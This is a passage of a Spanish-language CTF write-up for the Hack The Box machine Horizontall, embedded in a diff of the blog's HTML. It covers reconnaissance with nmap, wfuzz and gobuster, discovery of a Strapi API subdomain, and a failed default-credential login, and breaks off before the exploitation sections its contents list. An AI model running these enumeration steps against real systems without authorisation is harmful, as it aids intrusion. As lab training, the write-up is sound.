@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+ping -c 1 10.10.11.105 En este caso da un ttl de 63
+Entendiendo que ttl=64: Linux / ttl=128: Windows
+Esta máquina es Linux por aproximación'>
+<title>Resolución Máquina Horizontall</title>
+
+<link rel='canonical' href='https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Resolución Máquina Horizontall'>
+<meta property='og:description' content='En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+ping -c 1 10.10.11.105 En este caso da un ttl de 63
+Entendiendo que ttl=64: Linux / ttl=128: Windows
+Esta máquina es Linux por aproximación'>
+<meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/'>
+<meta property='og:site_name' content='d3b0o'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Fácil' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='Strapi' /><meta property='article:tag' content='CVE-2021-4034' /><meta property='article:published_time' content='2022-11-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-22T00:00:00&#43;00:00'/><meta property='og:image' content='https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/11.png' />
+<meta name="twitter:title" content="Resolución Máquina Horizontall">
+<meta name="twitter:description" content="En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+ping -c 1 10.10.11.105 En este caso da un ttl de 63
+Entendiendo que ttl=64: Linux / ttl=128: Windows
+Esta máquina es Linux por aproximación"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/11.png' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-WKTZJ16NWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-WKTZJ16NWQ', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/me_hu8ce9295535d46137a41121f9fb5616e1_5792_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">d3b0o</a></h1>
+            <h2 class="site-description">CTF Player</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Modo oscuro</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#reconocimiento">Reconocimiento</a>
+      <ol>
+        <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
+        <li><a href="#contenido-web">Contenido Web</a></li>
+        <li><a href="#buscar-subdirectorios-wfuzz">Buscar subdirectorios (wfuzz)</a></li>
+        <li><a href="#buscar-subdominios-gobuster">Buscar subdominios (gobuster)</a></li>
+        <li><a href="#buscar-subdirectorios-wfuzz-1">Buscar subdirectorios (wfuzz)</a></li>
+        <li><a href="#contenido-subdirectorios">Contenido subdirectorios</a></li>
+        <li><a href="#buscar-subdirectorios-sobre-admin-wfuzz">Buscar subdirectorios sobre /admin/ (wfuzz)</a></li>
+        <li><a href="#buscar-posible-vulnerabilidad-searchsploit">Buscar posible vulnerabilidad (searchsploit)</a></li>
+      </ol>
+    </li>
+    <li><a href="#explotación-de-vulnerabilidades">Explotación de Vulnerabilidades</a>
+      <ol>
+        <li><a href="#ejecutar-exploit">Ejecutar Exploit</a></li>
+        <li><a href="#reverse-shell">Reverse shell</a></li>
+      </ol>
+    </li>
+    <li><a href="#escalada-de-privilegios">Escalada de Privilegios</a>
+      <ol>
+        <li><a href="#tratamiento-de-la-tty">Tratamiento de la tty</a></li>
+        <li><a href="#flag-usuario">Flag Usuario</a></li>
+        <li><a href="#flag-root">Flag Root</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/">
+                <img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/11_hue7bd28cf1a5524d9c2a7458704ea32fd_1838821_800x0_resize_box_3.png"
+                        srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/11_hue7bd28cf1a5524d9c2a7458704ea32fd_1838821_800x0_resize_box_3.png 800w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/11_hue7bd28cf1a5524d9c2a7458704ea32fd_1838821_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="365" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Máquina Horizontall" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #488844; color: #fff;">
+                HTB
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/">Resolución Máquina Horizontall</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 22, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada</p>
+<hr>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p><strong>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</strong></p>
+<pre><code class="language-bash">ping -c 1 10.10.11.105
+</code></pre>
+<p>En este caso da un ttl de <strong>63</strong></p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/ping.png"
+	width="607"
+	height="150"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/ping_hu8b31a15267601668d60d01e80b1a7f08_19258_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/ping_hu8b31a15267601668d60d01e80b1a7f08_19258_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="971px"
+	
+></p>
+<p>Entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong></p>
+<p>Esta máquina es <strong>Linux</strong> por aproximación</p>
+<h3 id="escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</h3>
+<p>Ahora empezamos con un escaneo de puertos</p>
+<pre><code class="language-bash">nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.11.105 -oG allPorts
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p-</td>
+<td>Para que el escaneo sea a todos los puertos (65536)</td>
+</tr>
+<tr>
+<td>&ndash;open</td>
+<td>Para que solo reporte los puertos abiertos</td>
+</tr>
+<tr>
+<td>-sS &ndash;min-rate 5000</td>
+<td>Definir el tiempo del escaneo</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>Omitir resolución DNS</td>
+</tr>
+<tr>
+<td>-vvv</td>
+<td>Para que vaya reportando lo que encuentre por consola</td>
+</tr>
+<tr>
+<td>-Pn</td>
+<td>Skip host discovery</td>
+</tr>
+<tr>
+<td>-oG allPorts</td>
+<td>Para que guarde el escaneo en format grepeable en un archivo llamado allPorts</td>
+</tr>
+</tbody>
+</table></div>
+<p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p>
+<p><a class="link" href="https://pastebin.com/tYpwpauW"  target="_blank" rel="noopener"
+    >Función extractPorts</a> de <a class="link" href="https://s4vitar.github.io"  target="_blank" rel="noopener"
+    >@s4vitar</a></p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/extractPorts.png"
+	width="420"
+	height="235"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/extractPorts_hu00009b5ca6e16275fb874a8e18a551ec_17324_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/extractPorts_hu00009b5ca6e16275fb874a8e18a551ec_17324_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="428px"
+	
+></p>
+<p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
+<pre><code class="language-bash">nmap -p22,80 -sC -sV 10.10.11.105 -oN target
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p22,80</td>
+<td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td>
+</tr>
+<tr>
+<td>-sC</td>
+<td>Para que realice scripts básicos de reconocimiento</td>
+</tr>
+<tr>
+<td>-sV</td>
+<td>Proporciona la versión e información de los servicios que corren por los puertos</td>
+</tr>
+<tr>
+<td>-oN target</td>
+<td>Para que lo guarde en el archivo target en formato nmap</td>
+</tr>
+</tbody>
+</table></div>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/nmap.png"
+	width="909"
+	height="370"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/nmap_huf259710f5cff5a5b7d1e949246daf116_60380_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/nmap_huf259710f5cff5a5b7d1e949246daf116_60380_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="589px"
+	
+></p>
+<p>Se puede observar que en el puerto 80 hay un redirect a <a class="link" href="http://horizontall.htb"  target="_blank" rel="noopener"
+    >http://horizontall.htb</a></p>
+<p>Para poder abrir la web se tiene que añadir al archivo <code>/etc/hosts</code> una línea con:</p>
+<p><code>10.10.11.105      horizontall.htb</code></p>
+<p>Ejemplo:</p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts.png"
+	width="630"
+	height="230"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts_hu1e33643b250415aaa2447d46b894c5d0_20724_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts_hu1e33643b250415aaa2447d46b894c5d0_20724_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="273"
+		data-flex-basis="657px"
+	
+></p>
+<h3 id="contenido-web">Contenido Web</h3>
+<p>Al entrar a la web lo primero que se ve es una página en la cual no funcionan los links</p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-home.png"
+	width="1920"
+	height="1032"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-home_hu42ea7bdf69b9d25f78b8abae743b4d41_158284_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-home_hu42ea7bdf69b9d25f78b8abae743b4d41_158284_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="446px"
+	
+></p>
+<h3 id="buscar-subdirectorios-wfuzz">Buscar subdirectorios (wfuzz)</h3>
+<p>Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> con el siguiente comando:</p>
+<pre><code class="language-bash">wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-c</td>
+<td>Para que lo reporte todo con colores</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>Para configurar el tiempo</td>
+</tr>
+<tr>
+<td>&ndash;hc=404</td>
+<td>Para que no nos reporte los subdirectorios que no existan</td>
+</tr>
+<tr>
+<td>-w</td>
+<td>Es donde se indica el diccionario</td>
+</tr>
+<tr>
+<td>FUZZ</td>
+<td>Se escribe donde quieres aplicar el diccionario</td>
+</tr>
+</tbody>
+</table></div>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz.png"
+	width="637"
+	height="38"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz_hu2e7129de7612626e3f1bef2b9ce280d2_6406_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz_hu2e7129de7612626e3f1bef2b9ce280d2_6406_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1676"
+		data-flex-basis="4023px"
+	
+></p>
+<p>Solo ha encontrado 2 subdirectorios</p>
+<ul>
+<li>js</li>
+<li>css</li>
+</ul>
+<h3 id="buscar-subdominios-gobuster">Buscar subdominios (gobuster)</h3>
+<p>Con gobuster podemos buscar subdominios con el siguiente comando</p>
+<pre><code class="language-bash">gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u horizontall.htb
+</code></pre>
+<p>Encontramos un subdominio llamado api-prod.horizontall.htb, otra forma de haberlo encontrado sin el gobuster es dandole a inspeccionar y después entrando al Depurador y ahí se puede ver que hay 2 js</p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/inspecionar.png"
+	width="311"
+	height="205"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/inspecionar_huae93c1709bb614b6574a4bd05a955f1a_13785_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/inspecionar_huae93c1709bb614b6574a4bd05a955f1a_13785_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="151"
+		data-flex-basis="364px"
+	
+></p>
+<p><strong>El chunk-vendors.js</strong>, como su nombre lo dice, es un paquete para todos los módulos que no son tuyos, sino de otras partes. Se denominan módulos de terceros o módulos de proveedores.</p>
+<p>En cambio, el <strong>app.c68eb462.js</strong> tiene un nombre raro, al abrirlo, (<a class="link" href="http://horizontall.htb/js/app.c68eb462.js"  target="_blank" rel="noopener"
+    >http://horizontall.htb/js/app.c68eb462.js</a>) sale mucho texto, pero si se filtra por ejemplo .htb, podemos ver un subdominio:</p>
+<p><code>http://api-prod.horizontall.htb</code></p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/subdomain.png"
+	width="277"
+	height="81"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/subdomain_hu9b7e3b8b57d861725211c9f70bfca555_7738_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/subdomain_hu9b7e3b8b57d861725211c9f70bfca555_7738_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="341"
+		data-flex-basis="820px"
+	
+></p>
+<p>Para poder entrar a la web se tiene que añadir el subdominio al <code>/etc/hosts</code> como hicimos anteriormente de tal forma que quede así:</p>
+<p><code>10.10.11.105     horizontall.htb api-prod.horizontall.htb</code></p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts2.png"
+	width="610"
+	height="230"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts2_hucdb8ac211291c932f3b3fb18b87a9e97_21225_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts2_hucdb8ac211291c932f3b3fb18b87a9e97_21225_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="265"
+		data-flex-basis="636px"
+	
+></p>
+<p>Al entrar al api solo vemos una página en blanco con un título que pone welcome</p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-api.png"
+	width="1920"
+	height="1027"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-api_hudacf53ea351f3b2a42c0a6e0a5d06c26_25309_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-api_hudacf53ea351f3b2a42c0a6e0a5d06c26_25309_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="448px"
+	
+></p>
+<h3 id="buscar-subdirectorios-wfuzz-1">Buscar subdirectorios (wfuzz)</h3>
+<p>Para encontrar subdirectorios vamos a usar la misma herramienta que antes, wfuzz</p>
+<pre><code class="language-bash">wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-c</td>
+<td>Para que lo reporte todo con colores</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>Para configurar el tiempo</td>
+</tr>
+<tr>
+<td>&ndash;hc=404</td>
+<td>Para que no nos reporte los subdirectorios que no existan</td>
+</tr>
+<tr>
+<td>-w</td>
+<td>Es donde se indica el diccionario</td>
+</tr>
+<tr>
+<td>FUZZ</td>
+<td>Se escribe donde quieres aplicar el diccionario</td>
+</tr>
+</tbody>
+</table></div>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz2.png"
+	width="665"
+	height="62"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz2_hu42d13890827f620ad740e67e312e6e98_10341_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz2_hu42d13890827f620ad740e67e312e6e98_10341_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1072"
+		data-flex-basis="2574px"
+	
+></p>
+<p>El wfuzz ha encontrado 3 subdirectorios:</p>
+<ul>
+<li>admin</li>
+<li>reviews</li>
+<li>users</li>
+</ul>
+<h3 id="contenido-subdirectorios">Contenido subdirectorios</h3>
+<p>Probamos a entrar en reviews y vemos lo siguiente:</p>
+<pre><code class="language-bash">[{&quot;id&quot;:1,&quot;name&quot;:&quot;wail&quot;,&quot;description&quot;:&quot;This is good service&quot;,&quot;stars&quot;:4,&quot;created_at&quot;:&quot;2021-05-29T13:23:38.000Z&quot;,&quot;updated_at&quot;:&quot;2021-05-29T13:23:38.000Z&quot;},
+{&quot;id&quot;:2,&quot;name&quot;:&quot;doe&quot;,&quot;description&quot;:&quot;i'm satisfied with the product&quot;,&quot;stars&quot;:5,&quot;created_at&quot;:&quot;2021-05-29T13:24:17.000Z&quot;,&quot;updated_at&quot;:&quot;2021-05-29T13:24:17.000Z&quot;},
+{&quot;id&quot;:3,&quot;name&quot;:&quot;john&quot;,&quot;description&quot;:&quot;create service with minimum price i hop i can buy more in the futur&quot;,&quot;stars&quot;:5,&quot;created_at&quot;:&quot;2021-05-29T13:25:26.000Z&quot;,
+  
+&quot;updated_at&quot;:&quot;2021-05-29T13:25:26.000Z&quot;}]
+</code></pre>
+<p>Ya sabemos 3 usuarios:</p>
+<ul>
+<li>wail</li>
+<li>doe</li>
+<li>jhon</li>
+</ul>
+<p>Al entrar en el directorio admin nos mueve a admin/auth/login y hay un panel de login de strapi</p>
+<p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/strapi.png"
+	width="507"
+	height="452"
+	srcset="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/strapi_hubd8abe14bfd84db76ca50c48de6fb902_18316_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/strapi_hubd8abe14bfd84db76ca50c48de6fb902_18316_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="112"
+		data-flex-basis="269px"
+	
+></p>
+<p>Haciendo una búsqueda por google podemos encontrar las credenciales default de strapi, admin:admin, pero no funcionan.</p>
+<h3 id="buscar-subdirectorios-sobre-admin-wfuzz">Buscar subdirectorios sobre /admin/ (wfuzz)</h3>
+<p>Para ver si hay más subdirectorios en /admin/ volvemos a usar wfuzz pero ahora sobre el directorio admin</p>
+<pre><code class="language-bash">wfuzz -c -t 200 --hc=404 --hh=854 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/admin/FUZZ
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetros</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>-c</strong></td>
+<td>Para que lo reporte todo con colores</td>
+</tr>
+<tr>
+<td><strong>-t</strong></td>
+<td>Para configurar el tiempo</td>
+</tr>
+<tr>
